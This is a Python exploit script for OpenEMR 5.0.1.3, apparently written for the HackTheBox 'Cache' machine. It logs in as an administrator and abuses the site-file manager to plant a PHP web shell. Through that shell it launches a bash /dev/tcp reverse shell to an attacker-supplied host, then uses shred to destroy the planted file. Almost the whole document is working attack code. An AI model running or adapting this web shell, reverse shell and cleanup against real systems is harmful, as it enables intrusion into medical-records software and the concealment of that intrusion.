# Title: OpenEMR 5.0.1.3 - Authenticated File Upload > Remote Command Execution
# Author: lanz

#!/usr/bin/python3

import requests, time, argparse, base64
from pwn import *

class Color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

url_login = "http://hms.htb"
user = "openemr_admin"
password = "xxxxxx"

banner = base64.b64decode("4pWT4pSA4pSAIOKVk+KUgOKUgOKVluKVk+KUgOKUgCDilZMgIOKVluKVk+KUgOKUgArilZEgICDilZEgIOKVq+KVkSAgIOKVkSAg4pWr4pWRCuKVqyAgIOKVkeKUgOKUgOKVouKVqyAgIOKVq+KUgOKUgOKVq+KVq+KUgOKUgArilZnilIDilIDilIDilaggIOKVqOKVmeKUgOKUgOKUgOKVqCAg4pWo4pWo4pSA4pSA4oCiIEhUQgoKRXhwbG9pdGluZyBPcGVuRU1SIC0gRmlsZSBVcGxvYWQgPiBSZW1vdGUgQ29kZSBFeGVjdXRpb24gKFJldmVyc2UgU2hlbGwpLiBCeSBsYW56Zgo=").decode()

print("\n" + Color.BLUE + banner + Color.END)

def arguments():
    parse = argparse.ArgumentParser(description='AutoPWN Remote Code Execution machine Cache HackTheBox')
    parse.add_argument('-lhost', dest='lhost', type=str, required=True, help='Local IP to generate reverse shell')
    parse.add_argument('-lport', dest='lport', type=int, required=True, help='Local PORT to generate reverse shell')
    return parse.parse_args()

def access_revshell(url_login, user, password, lhost, lport):
    try:
        session = requests.Session()
        p1 = log.progress("OpenEMR login")
        p1.status("With " + user)
        time.sleep(2)

        data_login = {
            'new_login_session_management' : '1',
            'authProvider' : 'Default',
            'languageChoice' : '1',
            'authUser' : user,
            'clearPass' : password
        }

        # To login with openemr_admin
        request = session.post(url_login + '/interface/main/main_screen.php?auth=login&site=default', data=data_login, timeout=3)
        p1.success("Access granted to user " + user)
        time.sleep(1)

        # Management files
        p2 = log.progress("File upload")
        p2.status("Uploading custom_pdf.php")
        time.sleep(2)

        data_post = {
            'form_filename' : "letter_templates/custom_pdf.php",
            'form_filedata' : "<?php exec($_GET['xmd']); ?>",
            'MAX_FILE_SIZE' : '12000000',
            'form_dest_filename' : '',
            'bn_save' : 'Save'
        }
        data_file = [
            ('form_image',
                ('', '', 'application/octet-stream')),
            ('form_education',
                ('', '', 'application/octet-stream'))]

        request = session.post(url_login + '/interface/super/manage_site_files.php', files=data_file, data=data_post, timeout=3)
        p2.status("File custom_pdf.php upload succesfully")
        time.sleep(1)

        # Reverse shell
        p3 = log.progress("Reverse Shell")
        p3.status("Preparing connection")
        time.sleep(2)

        p3.status("Executing reverse shell")

        try:
            # bash -c 'bash -i >& /dev/tcp/10.10.10.0/443 0>&1'
            payload = "bash -c 'bash -i >%26 %2Fdev%2Ftcp%2F" + lhost + "%2F" + str(lport) + " 0>%261'"
            # When we make the connection, it'll run until we cancel. Timeout help us with this homework.
            request = session.get(url_login + '/sites/default/letter_templates/custom_pdf.php?xmd=' + payload, timeout=3)

            p3.failure("No port is listening")

            request = session.get(url_login + '/sites/default/letter_templates/custom_pdf.php?xmd=shred%20-zun%2010%20custom_pdf.php')
            p2.success("File custom_pdf.php deleted")
        except requests.exceptions.ReadTimeout:
            p3.success("Reverse shell executed to %s:%i" % (lhost, lport))

            request = session.get(url_login + '/sites/default/letter_templates/custom_pdf.php?xmd=shred%20-zun%2010%20custom_pdf.php')
            p2.success("File custom_pdf.php deleted")

    except requests.exceptions.ReadTimeout:
        p1.failure("Request time exceed!")

if __name__  == '__main__':
    args = arguments()
    access_revshell(url_login, user, password, args.lhost, args.lport)
